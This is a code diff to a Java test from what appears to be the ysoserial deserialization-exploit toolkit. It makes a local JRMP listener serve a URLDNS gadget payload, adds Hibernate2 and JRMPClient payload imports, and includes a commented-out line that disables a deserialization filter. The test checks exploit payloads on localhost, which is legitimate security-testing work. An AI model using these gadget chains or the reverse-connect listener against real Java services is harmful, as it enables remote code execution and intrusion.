@@ -8,8 +8,12 @@ import javax.management.BadAttributeValueExpException;
 import org.junit.Assert;
 
 import ysoserial.payloads.Atomikos;
+import ysoserial.payloads.Hibernate2;
+import ysoserial.payloads.JRMPClient;
+import ysoserial.payloads.URLDNS;
 import ysoserial.test.CustomTest;
 import ysoserial.exploit.JRMPListener;
+import ysoserial.test.util.ObjectInputFilters;
 
 
 /**
@@ -31,16 +35,12 @@ public class JRMPReverseConnectTest implements CustomTest {
 
 
     public void run ( Callable<Object> payload ) throws Exception {
-        JRMPListener l = new JRMPListener(port, new BadAttributeValueExpException("foo"));
+        DnsLookupTest innerTest = new DnsLookupTest();
+        JRMPListener l = new JRMPListener(port, new URLDNS().getObject(innerTest.getPayloadArgs()));
         Thread t = new Thread(l, "JRMP listener");
         try {
             t.start();
-            try {
-                payload.call();
-            }
-            catch ( Exception e ) {
-                // ignore
-            }
+            innerTest.run(payload);
             Assert.assertTrue("Did not have connection", l.waitFor(1000));
         }
         finally {
@@ -53,10 +53,13 @@ public class JRMPReverseConnectTest implements CustomTest {
 
     public String getPayloadArgs () {
     	return "rmi://localhost:" + port + "/ExportObject";
+//        return "rmi:localhost:" + port; // old version
+//        return "localhost:" + port;
     }
 
 
     public static void main(String[] args) throws Exception {
-        PayloadsTest.testPayload(Atomikos.class);
+//        ObjectInputFilters.disableDcgFilter();
+        PayloadsTest.testPayload(Hibernate2.class);
     }
 }
